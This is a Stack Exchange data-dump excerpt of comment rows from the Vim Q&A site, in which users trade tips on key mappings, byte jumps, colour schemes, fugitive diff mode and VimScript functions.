  <row Id="5497" PostId="3846" Score="0" Text="After changing `&lt;c-c&gt;` ti `GO`, your answer does exactly what I asked. Thanks! Small note: If I put your snippet in a single file (&quot;vimrcnew&quot;), and load it with `vim -u vimrcnew`, then the keybinding does not work (even though it works if I put it in my main `.vimrc`). Do you happen to know why that happens?" CreationDate="2015-07-06T17:27:56.920" UserId="2720" />
  <row Id="5498" PostId="3846" Score="0" Text="slightly edited answer - the cursor column was not the right one. Side effect: you have now only one jump back per line (should be ok for larger byte jumps). You probably need to use `set nocompatible` in your `vimrcnew` ?" CreationDate="2015-07-06T17:30:51.050" UserId="1800" />
  <row Id="5499" PostId="3846" Score="0" Text="... last edit (hopefully) - when used with argument 0 (no count), it re-uses the latest byte offset jump value." CreationDate="2015-07-06T17:37:30.447" UserId="1800" />
  <row Id="5500" PostId="3846" Score="0" Text="I've added an answer with my final solution. It's much shorter than your code and basically automates what I explained at the bottom of my question. Thanks for your help!" CreationDate="2015-07-06T17:39:58.767" UserId="2720" />
  <row Id="5501" PostId="3846" Score="0" Text="I had a strong feeling i was missing something :)" CreationDate="2015-07-06T17:41:19.067" UserId="1800" />
  <row Id="5502" PostId="3851" Score="4" Text="Can you provide an example where this happens? I would think this question is more suited as an issue for fugitive?" CreationDate="2015-07-06T20:01:39.463" UserId="21" />
  <row Id="5503" PostId="3852" Score="0" Text="One question, where exactly do you need this functionality? (BTW I ended up combining your solution with reusing the previous count if none is provided)." CreationDate="2015-07-06T20:38:08.797" UserId="1800" />
  <row Id="5504" PostId="3852" Score="1" Text="@VanLaser I was reading the raw contents of a PDF file, in order to get a better understanding of the PDF file format. A PDF file consists of many objects, and many of these objects have a length prefix. Being able to jump X bytes ahead was useful for debugging. And before you ask why I'm editing raw PDF files: I am developing a new feature for [PDF.js](https://github.com/mozilla/pdf.js) which requires a deeper knowledge of the PDF file format." CreationDate="2015-07-06T20:44:44.523" UserId="2720" />
  <row Id="5505" PostId="3852" Score="0" Text="Thanks for the answer (and good luck)! The combined version is here, if interested: http://pastebin.com/7sVyiA85" CreationDate="2015-07-06T20:55:44.210" UserId="1800" />
  <row Id="5506" PostId="3809" Score="1" Text="I might be wrong, but tag completion might work in this case. I do not personally do much web development, and so I am not that familiar with Vim for html/css/..., but I think that `ctags` should be able to generate tags for your project. Then you can do tag completion with `i_CTRL-X_CTRL-]`. However, I see in the docs that tag completion also uses the `iskeyword` option, so I might be wrong.&#xA;&#xA;In any case, you probably want to read `:h ins-completion`." CreationDate="2015-07-06T20:57:10.160" UserId="21" />
  <row Id="5507" PostId="3854" Score="1" Text="Does `:set lazyredraw` help?" CreationDate="2015-07-06T22:57:48.633" UserId="1800" />
  <row Id="5508" PostId="3854" Score="0" Text="Sorry, no. That only helps for macros. I just tried it, and it didn't work for my function." CreationDate="2015-07-07T06:19:31.613" UserId="2511" />
  <row Id="5509" PostId="3837" Score="0" Text="You people are geniuses." CreationDate="2015-07-07T06:47:03.637" UserId="2593" />
  <row Id="5510" PostId="3856" Score="3" Text="Definitely keep your fingers at `j,k,l,;`. For one, you'll learn to hit `h` in no time. Secondly, when you know vim better, you won't be using `h` all that much really. Thirdly, keybinds are mostly defined with that hand position in mind, so you'll just trade one problem for another set of problems in the long run." CreationDate="2015-07-07T06:54:05.207" UserId="1296" />
  <row Id="5511" PostId="3856" Score="1" Text="Don't bother. Vim has got much better cursor motion commands than `hjkl`. See `:help navigation`." CreationDate="2015-07-07T06:56:17.153" UserId="54" />
  <row Id="5512" PostId="3851" Score="3" Text="Is it possible that you have an issue with the end of line characters? When different people edit a file, some on windows and some on linux the end of line character are not the same and it can cause this kind of issue." CreationDate="2015-07-07T07:15:51.860" UserId="1841" />
  <row Id="5513" PostId="3858" Score="0" Text="Thanks for such a thorough answer!" CreationDate="2015-07-07T07:22:17.313" UserId="2732" />
  <row Id="5514" PostId="3858" Score="2" Text="The *&quot;use hjkl keys, arrow keys are evil&quot;*-dogma is a strong one in the Vi/Vim community, but in many ways it's also a silly one. Aside from the fact that I'm not at all convinced it is actually faster in all scenarios, even if it would be, is this *really* the most important thing about learning Vim? Or are there other things that will save you a lot more time (like motions, dealing with marks, registers, VimScript basics, etc.).... The whole &quot;hjkl&quot;-thing seems like a micro-optimisation at best." CreationDate="2015-07-07T08:06:53.070" UserId="51" />
  <row Id="5515" PostId="3858" Score="3" Text="I've been using computers for ~30 years.  Every 5 years or so I renew my attempts to learn to type &quot;properly&quot;.  So far, every single time I did that I also developed acute carpal tunnel syndrome symptoms within the first few days.  And every single time the symptoms went away as soon as I gave up and went back to my old habits.  I've also been doing martial arts for ~40 years, and never had any joint problems. My habits include using the arrow keys, and moving the hands a lot while typing.  The `hjkl` thing has never helped me.  What did help was buying good quality mechanical keyboards. FWIW." CreationDate="2015-07-07T08:10:15.673" UserId="1577" />
  <row Id="5516" PostId="3854" Score="2" Text="I don't know of any way to do this, other than perhaps freezing the terminal window (which won't work for gVim). But perhaps there is another way to make your function run with less screen updates? It would be helpful if you posted your function ;-)" CreationDate="2015-07-07T08:41:03.813" UserId="51" />
  <row Id="5517" PostId="3832" Score="1" Text="@Janis Some places where it would be useful in an editor: creating UUID's, creating uniquely named temp files/dirs (e.g. `mkstemp()`), creating &quot;secrets&quot; (many applications have a &quot;secret&quot; for encrypting cookies and whatnot)..." CreationDate="2015-07-07T09:04:32.530" UserId="51" />
  <row Id="5519" PostId="3861" Score="2" Text="The problem is, it has to evaluate the whole file. And replace `# =&gt;` on every line." CreationDate="2015-07-07T10:14:31.043" UserId="237" />
  <row Id="5520" PostId="3861" Score="1" Text="that is right, but for quick evaluation of a single line (as I first understand the question) this should work, I edited my answer" CreationDate="2015-07-07T10:16:10.190" UserId="1821" />
  <row Id="5521" PostId="3830" Score="0" Text="Carpet, muru, thank you both! @muru, since your link is specifically `@`-related, please answer and I'll accept.  Carpet, I'll upvote if you answer." CreationDate="2015-07-07T10:19:57.927" UserId="1430" />
  <row Id="5522" PostId="3858" Score="0" Text="I answered the question because I read this a short time ago and I felt that it fitted well to the need of the OP. On the topic of hand placement, the french I am uses an AZERTY keyboard so the question doesn't actually exists: My left hand is on `hjkl` since the key on the right of `l` is `m` which is pretty useless. About the optimisation of using these keys to navigate I try to force myself to use the movements as much as I can but I still often use `hjkl`, I still feel it's faster than the arrow keys but I guess that its a pretty subjective topic." CreationDate="2015-07-07T10:33:53.000" UserId="1841" />
  <row Id="5525" PostId="3866" Score="0" Text="Also see: [How to join lines without producing a space?](http://vi.stackexchange.com/q/439/51)." CreationDate="2015-07-07T11:49:22.957" UserId="51" />
  <row Id="5526" PostId="3851" Score="0" Text="@KarlYngveLervåg - thank you for your comment. I'll try to show an example. The problem is that it's difficult to reproduce the problem. I'll monitor my workflow until the problem appears, so that to have more concrete steps." CreationDate="2015-07-07T12:23:57.620" UserId="2725" />
  <row Id="5527" PostId="3851" Score="0" Text="@statox - I am checking it." CreationDate="2015-07-07T12:24:33.607" UserId="2725" />
  <row Id="5528" PostId="3865" Score="0" Text="Now I'm curious about the first part and how `&lt;c-y&gt;` relates to the pop-up menu." CreationDate="2015-07-07T13:16:03.410" UserId="2736" />
  <row Id="5529" PostId="3865" Score="2" Text="See this answer: http://vi.stackexchange.com/a/3844/1800 . `Ctrl-y` in insert mode will complete the current popup selection, and the above mapping will allow `Enter` to complete too." CreationDate="2015-07-07T13:19:49.587" UserId="1800" />
  <row Id="5530" PostId="3865" Score="2" Text="Ah nifty, thanks." CreationDate="2015-07-07T13:27:48.873" UserId="2736" />
  <row Id="5531" PostId="3868" Score="0" Text="Perhaps try this, is very recent: http://www.kaoriya.net/software/vim/ - one of  the Win32 / Win64 links. You'll have to remove `vimrc` and `gvimrc` from the main vim folder after extracting the archive. I use the 64bit version." CreationDate="2015-07-07T13:55:37.410" UserId="1800" />
  <row Id="5532" PostId="3865" Score="0" Text="Nice trick.  However, I'd probably replace the last part `&quot;&lt;c-g&gt;u&lt;cr&gt;&quot;` by `&amp;paste ? &quot;&lt;cr&gt;&quot; : &quot;&lt;c-g&gt;u&lt;cr&gt;&quot;`, otherwise next time you paste by mistake 200 lines of HTML you'll have a lot of fun undoing it. :)" CreationDate="2015-07-07T14:51:11.140" UserId="1577" />
  <row Id="5533" PostId="3868" Score="0" Text="There are a few people that maintain up-to-date builds for Windows, you might want to ask about that on [vim_use](https://groups.google.com/forum/#!forum/vim_use)." CreationDate="2015-07-07T14:54:27.223" UserId="1577" />
  <row Id="5534" PostId="3864" Score="0" Text="&quot;Near the enter&quot; depends on your keyboard: UK ones have `\` next to the left-hand shift :-)" CreationDate="2015-07-07T15:58:56.253" UserId="2740" />
  <row Id="5535" PostId="3865" Score="0" Text="everything can be improved ;) never happened to me so far though (I usually paste from normal mode)" CreationDate="2015-07-07T16:16:04.070" UserId="1800" />
  <row Id="5536" PostId="3865" Score="0" Text="Actually, I just tested with `set paste` and ... it seems to do something &quot;magic&quot; itself, by undoing the whole insert session in one go (as if the `CR` insert mode mapping is ignored)" CreationDate="2015-07-07T16:40:57.817" UserId="1800" />
  <row Id="5537" PostId="3871" Score="0" Text="Wow!  Who would have thought that that would be so difficult in vim natively?  I really like the grep solution though.  Thanks!" CreationDate="2015-07-07T19:19:34.310" UserId="318" />
  <row Id="5538" PostId="3872" Score="0" Text="I can just have vim call grep... :)" CreationDate="2015-07-07T19:20:28.133" UserId="318" />
  <row Id="5539" PostId="3871" Score="0" Text="Most of the hard work is done in the `:s` command. It is actually a testament to the versatility of the `:s` command. However it does pale in comparison to how easy this job is with `grep`." CreationDate="2015-07-07T19:24:13.147" UserId="778" />
  <row Id="5540" PostId="3873" Score="1" Text="This is a better pure Vim way. However if you want to save the matches register without destroying the buffer, then the `:s` with sub-replace-expression is the way to go." CreationDate="2015-07-07T21:49:30.467" UserId="778" />
  <row Id="5541" PostId="3873" Score="0" Text="No doubt! It just seemed like a nice challenge." CreationDate="2015-07-07T21:56:40.847" UserId="1800" />
  <row Id="5542" PostId="3878" Score="0" Text="what does `&lt;silent&gt;`mean?" CreationDate="2015-07-08T02:39:02.107" UserId="2206" />
  <row Id="5543" PostId="3878" Score="0" Text="It prevents echoing anything to the status line. I'm pretty sure it doesn't do anything in this specific case, it was just there wherever I originally copied it from, long ago. See `:h map-silent`." CreationDate="2015-07-08T02:42:55.153" UserId="9" />
  <row Id="5544" PostId="3832" Score="0" Text="@Carpetsmoker; it's obvious that there's a lot places where random numbers are helpful. But you didn't explain why that would be a sensible feature *in an editor*. In my book, an editor is used to create and modify texts and not to perform shell tasks like creating temporary files. To obtain functions of external commands vi and vim also support a standard interface, so it seems unnecessary to implement every possible function in the editor. But, again; feel free to elaborate on the necessity for a built-in." CreationDate="2015-07-08T03:00:51.777" UserId="2479" />
  <row Id="5545" PostId="3851" Score="1" Text="I run into something that sounds like this when I'm looking at many diffs, one after another. What's happening is more than 2 files are in diff mode. You can disable diff mode in all buffers with `:bufdo diffoff`." CreationDate="2015-07-08T03:41:53.380" UserId="64" />
  <row Id="5546" PostId="3875" Score="0" Text="Take a look at: http://vim.wikia.com/wiki/Insert_newline_without_entering_insert_mode" CreationDate="2015-07-08T04:32:36.507" UserId="1892" />
  <row Id="5547" PostId="3879" Score="1" Text="As far as I can tell that's pretty much the only way." CreationDate="2015-07-08T06:32:06.790" UserId="1577" />
  <row Id="5548" PostId="3880" Score="1" Text="Note that mapping `&lt;S-Enter&gt;` doesn't work in terminal emulators (it only works in gVim).  So you'll need to choose a diffferent key combination to map it to ;-)" CreationDate="2015-07-08T07:42:41.333" UserId="51" />
  <row Id="5549" PostId="3874" Score="0" Text="Sweet, I didn't know about the `Ctrl-w`use in insert-mode. But the  Carpetsmoker♦ is still quicker. Thus the default binding of `Ctrl-\\`doesn't seems that useful." CreationDate="2015-07-08T07:44:30.080" UserId="1821" />
  <row Id="5550" PostId="3874" Score="1" Text="Ctrl+w is &quot;standard Vim&quot; ;-) See: [`:help i_CTRL-W`](http://vimhelp.appspot.com/insert.txt.html#i_CTRL%2dW). And pressing it twice seems to do the trick as well?" CreationDate="2015-07-08T07:44:46.417" UserId="51" />
  <row Id="5551" PostId="3874" Score="0" Text="I just saw on the help page that `&lt;C-u&gt;` may be more usefull as it deletes all the characters on the new line" CreationDate="2015-07-08T07:46:55.220" UserId="1821" />
  <row Id="5552" PostId="3879" Score="0" Text="OK... I will try to write one such script..." CreationDate="2015-07-08T08:48:57.287" UserId="2749" />
  <row Id="5553" PostId="3851" Score="0" Text="@tommcdo - your suggestion helped! Can you please format your comment as an answer, so that i can mark it as accepted? I am wondering though, is this a bug? I was just trying to commit a dozen or so files, and had to `:bufdo diffoff` twice, as the issue got reproduced twice with different files." CreationDate="2015-07-08T09:23:16.110" UserId="2725" />
  <row Id="5554" PostId="3882" Score="1" Text="have you tried downloading another color scheme ? you can find some on : http://vimcolors.com/" CreationDate="2015-07-08T10:39:24.000" UserId="1821" />
  <row Id="5556" PostId="3882" Score="1" Text="It may come as a surprise to you, but syntax files don't specify colours.  What you want to change is your _colours scheme_, not the syntax files. Messing with files in `/usr/share/vim/vim74` is likely to break vim.  Just pick a colour scheme and install that." CreationDate="2015-07-08T10:59:34.763" UserId="1577" />
  <row Id="5557" PostId="3882" Score="0" Text="Hmm, the color schemes look interesting, but I'm having trouble installing. I selected https://github.com/scheakur/vim-scheakur and then created `scheakur.vim` inside `~/.vim/colors`. After firing `vim`, I did `set background=light` and `colorscheme scheakur` when the whole (PHP) text became black! What could be wrong?" CreationDate="2015-07-08T11:07:34.857" UserId="2752" />
  <row Id="5558" PostId="3886" Score="1" Text="the `|` is good, but that doesn't work in `_vimrc` file. It would be ok if you replace it with `&lt;bar&gt;` (as the answer in stackoverflow suggest)" CreationDate="2015-07-08T11:08:09.700" UserId="2206" />
  <row Id="5559" PostId="3882" Score="0" Text="can you confirm that you want to change the colorscheme @dotslash ? Because with what you did we got confused ... Did you reset the previous `php.vim` ?" CreationDate="2015-07-08T11:09:13.637" UserId="1821" />
  <row Id="5560" PostId="3882" Score="0" Text="@Nobe4 Hey, I guess that particular color scheme was broken. I tried another one and it worked! Thanks for pointing me in the right direction. :-)" CreationDate="2015-07-08T11:14:52.747" UserId="2752" />
  <row Id="5561" PostId="3882" Score="0" Text="And yes, I did reset `php.vim`" CreationDate="2015-07-08T11:16:59.440" UserId="2752" />
  <row Id="5562" PostId="3885" Score="0" Text="Beware that `&lt;C-[&gt;` is the same as `&lt;ESC&gt;`.  It's a really bad idea to mess with that.  You might want to choose a different key combination." CreationDate="2015-07-08T11:20:25.480" UserId="1577" />
  <row Id="5563" PostId="3885" Score="0" Text="@lcd047 oh yeah that is right. thanks for that" CreationDate="2015-07-08T11:26:38.170" UserId="2206" />
  <row Id="5564" PostId="3886" Score="0" Text="Why doesn't `|` work in Windows?" CreationDate="2015-07-08T12:45:02.253" UserId="51" />
  <row Id="5565" PostId="3886" Score="0" Text="`|` doesn't work, you either need `\|` or `&lt;bar&gt;`." CreationDate="2015-07-08T12:48:18.693" UserId="54" />
  <row Id="5566" PostId="3886" Score="0" Text="on the documentation, there is no mention of this incompatibility. But as @michaelmichael said on he's answer : `NB: You may find that your ~/.vimrc doesn't support mapping |, or \|. In these cases, try using &lt;bar&gt; instead.`" CreationDate="2015-07-08T12:49:31.603" UserId="1821" />
  <row Id="5567" PostId="3851" Score="1" Text="@siphiuel I'm not sure if it's a bug or a workflow issue. From a Vim perspective, there's only ever one set of files being diffed against each other, so every buffer in diff mode is contributing to a single diff. I used to run into this a lot, but I don't anymore. Are you using the latest version of fugitive? (I'll post my answer once I'm at a full keyboard)" CreationDate="2015-07-08T12:53:30.970" UserId="64" />
  <row Id="5568" PostId="3801" Score="0" Text="I love using abbreviations for this! If you set `:ab idt &lt;c-r&gt;=strftime('%y-%m-%d %H:%M:%S')&lt;cr&gt;` then you can simply type &quot;idt&quot; while in insert mode." CreationDate="2015-07-08T13:18:50.830" UserId="599" />
  <row Id="5569" PostId="3888" Score="0" Text="But also note that the `&lt;C-p&gt;` is used to autocomplete text in vim, which is a built-in utility. I haved used a `&lt;M-p&gt;` instead. But anyway, the`&lt;Esc&gt;` in front of the command is a very good addition." CreationDate="2015-07-08T13:42:29.307" UserId="2206" />
  <row Id="5570" PostId="3882" Score="1" Text="glad I could help, I recommend watching http://vimcasts.org/episodes/creating-colorschemes-for-vim/ if you want to create your own colorscheme :)" CreationDate="2015-07-08T13:49:33.790" UserId="1821" />
  <row Id="5571" PostId="3888" Score="0" Text="@Alex You have mapped it only in normal mode. So you can still use `&lt;C-P&gt;` in insert mode to autocomplete text." CreationDate="2015-07-08T13:51:34.563" UserId="2620" />
  <row Id="5572" PostId="3831" Score="0" Text="Did you try with some search/substitute/sort commands ?" CreationDate="2015-07-08T13:55:36.503" UserId="1821" />
  <row Id="5573" PostId="3889" Score="0" Text="I don't reproduce, can you give a little more infos about your edition ?" CreationDate="2015-07-08T14:15:23.770" UserId="1821" />
  <row Id="5574" PostId="3889" Score="1" Text="Perhaps you have autoformat on: `:h autoformat` and `set formatoptions?`" CreationDate="2015-07-08T14:28:43.387" UserId="1800" />
  <row Id="5575" PostId="3789" Score="1" Text="Instead of using `?&quot;&lt;Enter&gt;` to search for a quote backward on a line, you can use `F&quot;`. `F` is the same as `f` but searches to the left. The answers below look better for your question, but `F` is a useful command on its own." CreationDate="2015-07-08T14:33:30.000" UserId="2680" />
  <row Id="5576" PostId="3851" Score="0" Text="@tommcdo: just checked - my fugitive version is the latest. Weird though, i've tried reproducing it again, but it's difficult to spot a pattern. Sometimes it works until 3rd or 4th consecutive diff, and then breaks. But it's not a regular behaviour. Given that there's a single diff files set (i'd love to find out more about it), then it would seem it's an issue with Fugitive, in that it does not properly close diff buffers? (sorry if this sounds stupid, i am a total beginner)" CreationDate="2015-07-08T15:35:47.617" UserId="2725" />
  <row Id="5577" PostId="3851" Score="0" Text="@tommcdo There are also two Fugitive issues [#36](https://github.com/tpope/vim-fugitive/issues/36) and [#91](https://github.com/tpope/vim-fugitive/issues/91) that reference the same kind of problem. You've been active in the first thread as well)" CreationDate="2015-07-08T15:45:02.320" UserId="2725" />
  <row Id="5578" PostId="3892" Score="1" Text="Remove the semicolons from the beginning of the commands,  that is invalid syntax." CreationDate="2015-07-08T17:40:32.083" UserId="865" />
  <row Id="5579" PostId="3895" Score="0" Text="Yes, this does return the line percentage, but I was looking for a function which shows the scroll percentage.  (or whatever value `ruler` shows when it is set)" CreationDate="2015-07-08T18:04:45.990" UserId="865" />
  <row Id="5580" PostId="3893" Score="0" Text="I didn't realize I had both Vim and gVim, you are right that gVim can be resized with the mouse. I thought the whole Windows version I am using was called gVim, now I know." CreationDate="2015-07-08T18:29:38.950" UserId="1552" />
  <row Id="5581" PostId="3895" Score="0" Text="I can see the need to know a line, char or byte relative position in a file or buffer, but not the need to have a value of an unknown yet formula :)" CreationDate="2015-07-08T18:29:46.127" UserId="1800" />
  <row Id="5582" PostId="3895" Score="0" Text="I don't really have a particular use for it, I just thought it might be interesting to see what people answer and whether it is possible or not.  :P" CreationDate="2015-07-08T18:42:50.300" UserId="865" />
  <row Id="5583" PostId="3892" Score="2" Text="@EvergreenTree No, it's not invalid to have the `:` in vimscript.  Vim just ignores it.  You can have as many leading `:` as you want." CreationDate="2015-07-08T19:20:36.017" UserId="15" />
  <row Id="5584" PostId="3892" Score="0" Text="I didn't realize that.  I always though it designated a one-liner that the user would type out manually.  Interesting!" CreationDate="2015-07-08T19:23:37.980" UserId="865" />
  <row Id="5585" PostId="3894" Score="0" Text="I found two lines in the vim source code that may be relevant: https://github.com/vim/vim/blob/a46ca5b0234998f81f6e42bcca1f9c4b33323df9/src/buffer.c#L3998 and https://github.com/vim/vim/blob/a46ca5b0234998f81f6e42bcca1f9c4b33323df9/src/buffer.c#L4410" CreationDate="2015-07-08T19:24:44.200" UserId="865" />
  <row Id="5586" PostId="3892" Score="0" Text="I was confused because it worked, but I find it cleaner without" CreationDate="2015-07-08T19:25:59.677" UserId="1821" />
  <row Id="5587" PostId="3896" Score="0" Text="Great!  This works (almost) exactly the same way `ruler` and `%P` does.  I thought that translating the source code could be a way of accomplishing this." CreationDate="2015-07-08T19:26:46.560" UserId="865" />
  <row Id="5588" PostId="3897" Score="1" Text="can this help : http://stackoverflow.com/a/15124717/2558252 ?" CreationDate="2015-07-08T19:34:53.780" UserId="1821" />
  <row Id="5589" PostId="3897" Score="0" Text="thanks for this but can you please elaborate the process in a bit detail? Moreover the answer in not complete. The guy just gave an hint" CreationDate="2015-07-08T19:36:17.260" UserId="2758" />
  <row Id="5590" PostId="3896" Score="0" Text="Very nice! But I still hope for more useful questions (in real life) that will get such good answers." CreationDate="2015-07-08T19:49:12.983" UserId="1800" />
  <row Id="5591" PostId="3892" Score="0" Text="@Nobe4: Your function displays only 15 out of the 23 struct names shown in the question's example. It missed out the other 9 struct names." CreationDate="2015-07-08T21:55:22.290" UserId="2706" />
  <row Id="5592" PostId="3892" Score="0" Text="@manavm-n yes, but as I said, even with a normal search I don't find all keywords. For example : `smsc911x_data`" CreationDate="2015-07-08T21:58:53.170" UserId="1821" />
  <row Id="5593" PostId="3892" Score="0" Text="Are you using the same file as provided in the link?" CreationDate="2015-07-08T22:01:37.240" UserId="2706" />
  <row Id="5594" PostId="3892" Score="0" Text="yes, and searching with my browser's finder, I don't find `smsc911x_data`, `smsc911x_ops`, `smsc911x_platform_config` for example ..." CreationDate="2015-07-08T22:02:51.863" UserId="1821" />
  <row Id="5595" PostId="3892" Score="0" Text="Ahhh.. the person who edited previously put the link to the stable version on Torvald's git tree. However, I posted the output for a prepatch version 4.1.0-rc8." CreationDate="2015-07-08T22:21:24.007" UserId="2706" />
  <row Id="5596" PostId="3892" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/25641/discussion-between-nobe4-and-manav-m-n)." CreationDate="2015-07-08T22:34:38.967" UserId="1821" />
  <row Id="5597" PostId="3888" Score="0" Text="oh yes you are right." CreationDate="2015-07-08T23:17:29.420" UserId="2206" />
  <row Id="5598" PostId="3882" Score="0" Text="@Nobe4 Superb! I can't express how happy this has made me! :) :D" CreationDate="2015-07-09T03:34:12.793" UserId="2752" />
  <row Id="5599" PostId="3899" Score="0" Text="Good enough... Plus, it will most likely maintain window positions for horizontally split windows too. I will accept this answer, after some more testing... Thanks" CreationDate="2015-07-09T04:02:19.943" UserId="2749" />
  <row Id="5600" PostId="3899" Score="0" Text="Works great. I also added the &amp;diff logic from my answer to this answer in my `.exrc`.." CreationDate="2015-07-09T07:05:27.180" UserId="2749" />
  <row Id="5601" PostId="3903" Score="0" Text="great, thank you! can you please explain what exactly `wincmd p` does?" CreationDate="2015-07-09T07:56:59.687" UserId="1317" />
  <row Id="5602" PostId="3903" Score="1" Text="yw. I edited the answer to add an explanation." CreationDate="2015-07-09T09:22:00.593" UserId="1800" />
  <row Id="5606" PostId="3899" Score="0" Text="Diff should work when `'sessionoptions'` has the `localoptions` value." CreationDate="2015-07-09T14:34:05.677" UserId="778" />
  <row Id="5607" PostId="3854" Score="0" Text="You asked for it, @Carpetsmoker. ;-) Function added. (It's rather long.)" CreationDate="2015-07-09T22:23:07.063" UserId="2511" />
  <row Id="5608" PostId="25" Score="0" Text="Check out this question: http://vi.stackexchange.com/questions/3882/change-default-syntax-highlighting-scheme" CreationDate="2015-07-10T09:41:18.747" UserId="2752" />
  <row Id="5609" PostId="3907" Score="2" Text="[This Ingo's answer](http://unix.stackexchange.com/a/116673/90314) might be relevant and not really a good news for you." CreationDate="2015-07-10T09:43:18.880" UserId="1841" />
  <row Id="5610" PostId="3907" Score="4" Text="`&lt;C-[&gt;` is the same as `&lt;ESC&gt;` on UNIX.  Just choose another key combination." CreationDate="2015-07-10T10:04:38.947" UserId="1577" />
  <row Id="5611" PostId="3907" Score="0" Text="Thanks, I'll use something else." CreationDate="2015-07-10T10:58:40.950" UserId="859" />
  <row Id="5612" PostId="3831" Score="0" Text="just use `ctags` and vim tags functionality. &quot;embedded&quot; is no excuse :P  since you can push the source and generate the tags elsewhere, and pull everything back after." CreationDate="2015-07-10T16:07:37.353" UserId="1800" />
  <row Id="5613" PostId="3846" Score="0" Text="I've changed the checkmark because your answer has a defect in byte counting (the answer on which you're basing the byte counting is incorrect). I've posted a [howto over there](https://vi.stackexchange.com/a/3911/2720) and updated my answer here with the improved byte counting method. I hope that you don't mind." CreationDate="2015-07-10T16:55:59.183" UserId="2720" />
  <row Id="5614" PostId="3846" Score="0" Text="No problem, and glad you found a general solution!" CreationDate="2015-07-10T17:00:47.523" UserId="1800" />
  <row Id="5615" PostId="3819" Score="0" Text="I have now fully reinstalled gVIM with all nessesary plugins and Omnisharp. &lt;C-x&gt;&lt;C-o&gt; Triggers the Omnisharp Completion but it never finds anything. &lt;C-n&gt; only finds keywords that I previously typed." CreationDate="2015-07-10T18:20:52.970" UserId="2689" />
  <row Id="5617" PostId="3908" Score="0" Text="Do you have `'noequalalways'` set?" CreationDate="2015-07-10T22:05:40.707" UserId="64" />
  <row Id="5618" PostId="3916" Score="0" Text="Don't do that in Vim, use a watcher instead like Grunt/Brunch/Gulp." CreationDate="2015-07-11T12:10:48.480" UserId="54" />
  <row Id="5619" PostId="3907" Score="0" Text="I wouldn't say this is a duplicate as I was not aware I was tampering with the definition of escape and don't wish to change it. Essentially my question has two parts; the inability to map the key, which I know understand, and why it dumps me into replace mode." CreationDate="2015-07-11T13:59:20.340" UserId="859" />
  <row Id="5620" PostId="3919" Score="1" Text="Just for completeness. I decided to go with this in my vimrc: `nnoremap &lt;Up&gt; 10k` and `nnoremap &lt;Down&gt; 10j` seem to work nicely." CreationDate="2015-07-11T14:39:36.997" UserId="2792" />
  <row Id="5621" PostId="3914" Score="0" Text="Are `autoindent` and `cindent` on? Try setting them on, maybe that will help?" CreationDate="2015-07-11T14:47:26.497" UserId="2792" />
  <row Id="5622" PostId="3914" Score="0" Text="Ok here is a hack in your vimrc add: `inoremap { {&lt;CR&gt;}&lt;C-o&gt;O` this means that every time in insert mode when you hit `{` vim will put a `{`, press Enter, put the closing `}` and open at line above it.  So....... actually instead of using the hack you can just train your fingers to hit `shift + O` after you hit enter." CreationDate="2015-07-11T14:59:58.373" UserId="2792" />
  <row Id="5623" PostId="3913" Score="1" Text="Actually instead of `^ d $` you can do `_ D` (underscore capital d) to cut to end (without newline) from the beginning of text. (this will ignore indenting whitespace at start of line). Might be a bit easier to type." CreationDate="2015-07-11T15:05:40.817" UserId="2792" />
  <row Id="5624" PostId="3923" Score="0" Text="When you create functions in a dictionary directly (i.e. a &quot;numbered function&quot;), you don't need the `dict` keyword. This applies to your &quot;class methods&quot;. See `:h numbered-function`." CreationDate="2015-07-11T19:33:40.627" UserId="21" />
  <row Id="5625" PostId="3923" Score="0" Text="@KarlYngveLervåg Technically it applies to both class and object methods (i.e. there's no need for `dict` for any of the `MyClass` functions).  But I find that confusing, so I tend to add `dict` explicitly." CreationDate="2015-07-11T20:46:27.553" UserId="1577" />
  <row Id="5626" PostId="3924" Score="1" Text="On [SO](http://stackoverflow.com/q/4292733/438329)" CreationDate="2015-07-12T03:45:41.990" UserId="778" />
  <row Id="5627" PostId="3924" Score="0" Text="Thanks! I'd make it an answer here, if you don't." CreationDate="2015-07-12T04:55:49.197" UserId="925" />
  <row Id="5628" PostId="3923" Score="0" Text="I see. So you add `dict` for object methods, but not for class methods, in order to help clarify your intent?" CreationDate="2015-07-12T11:08:29.317" UserId="21" />
  <row Id="5629" PostId="3923" Score="0" Text="@lcd047 Thanks a lot for this amazing answer! I'll have to work on it but that is exactly what I was looking for!" CreationDate="2015-07-12T12:02:54.900" UserId="1841" />
  <row Id="5631" PostId="3916" Score="0" Text="Related: http://vi.stackexchange.com/questions/258/how-do-i-run-a-command-on-creation-of-a-new-file" CreationDate="2015-07-12T15:44:02.817" UserId="205" />
  <row Id="5632" PostId="3919" Score="1" Text="IMHO, you should have mapped those keys to ctrl-u and and cltr-d, respectively. Then you could `set scroll=10` to have a similar behavior." CreationDate="2015-07-12T15:57:20.070" UserId="599" />
  <row Id="5633" PostId="3923" Score="1" Text="@KarlYngveLervåg There's a subtility here, the meaning of `self` is different for class methods and for object methods -- it's the class itself in the former case, and the instance of the current object in the latter.  For this reason I always refer to the class itself as `g:MyClass`, never using `self`, and I mostly see the `dict` as a reminder that it's ok to use `self` (that is, a function that has `dict` always acts on an object instance).  Than again, I don't use class methods much, and when I do that I also tend to omit `dict` everywhere.  Yeah, self-consistency is my middle name. ;)" CreationDate="2015-07-12T16:25:05.277" UserId="1577" />
  <row Id="5634" PostId="3927" Score="0" Text="Thank you, this seems to work very well and is much more easily applied to similar situations than the mix of macros and registers that I had imagined.&#xA;I have one suggestion to generalize your solution:&#xA;Could the function take a string `name` as argument and then perform the substitutions inside `name{ }` instead of `label{ }`? Then I could call the function with argument `label` with the same effect as `:call ReplaceInLabels()`. How would I do that?" CreationDate="2015-07-12T17:24:52.757" UserId="2804" />
  <row Id="5635" PostId="3927" Score="0" Text="Yes, why not :) I edited the answer. I'll also probably add a command that takes a name as parameter (easier to use) - and ... done." CreationDate="2015-07-12T17:31:04.400" UserId="1800" />
  <row Id="5636" PostId="3908" Score="0" Text="@tommcdo nope, I'll give that a whirl" CreationDate="2015-07-12T18:50:45.273" UserId="2778" />
  <row Id="5637" PostId="3908" Score="0" Text="No, don't, I was suspecting that was the problem :)" CreationDate="2015-07-12T18:51:40.227" UserId="64" />
  <row Id="5638" PostId="3927" Score="0" Text="Shouldn't it be `:call ReplaceSpecialChars('label')` instead of `:ReplaceSpecialChars label`? The latter doesn't work for me." CreationDate="2015-07-12T19:14:04.497" UserId="2804" />
